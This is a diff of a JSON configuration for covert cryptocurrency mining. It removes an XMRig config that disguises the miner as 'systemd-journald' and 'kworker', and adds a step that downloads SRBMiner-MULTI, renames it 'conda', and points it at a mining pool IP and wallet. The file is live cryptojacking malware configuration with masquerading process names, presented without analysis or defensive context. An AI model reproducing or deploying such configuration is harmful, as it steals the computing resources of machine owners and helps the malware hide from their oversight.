@@ -1,32 +1,15 @@
 {
-  "autosave": true,
-  "cpu": {
-  "enabled": true,
-  "priority": null,
-  "yield": true,
-  "max-threads-hint": 85,
-  "rx/0": [-1, -1, -1, -1,-1, -1, -1]
+  "download": {
+    "url": "https://raw.githubusercontent.com/apaple/pack/main/SRBMiner-MULTI",
+    "filename": "SRBMiner-MULTI",
+    "new_name": "conda"
   },
-  "background": false,
-  "pools": [
-    {
-      "url": "24.199.99.228:1935",      
-      "user": "85MLqXJjpZEUPjo9UFtWQ1C5zs3NDx7gJTRVkLefoviXbNN6CyDLKbBc3a1SdS7saaXPoPrxyTxybAnyJjYXKcFBKCJSbDp",  
-      "pass": "Danis",
-      "keepalive": true,
-      "tls": true
-    }
-  ],
-  "api": {
-    "port": 0                             
-  },
-  "print-time": 60,                          
-  "pause-on-battery": false,
-  "retries": 5,
-  "retry-pause": 5,
-  "donate-level": 1,                         
-  "log-file": "xmrig.log",                   
-  "syslog": false,
-  "user-agent": "kworker/u16:3",             
-  "title": "systemd-journald"                
+  "miner": {
+    "disable_gpu": true,
+    "algorithm": "power2b",
+    "pool": "43.157.91.13:8080",
+    "wallet": "mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05",
+    "worker_name": "Danis",
+    "threads": "auto"
+  }
 }
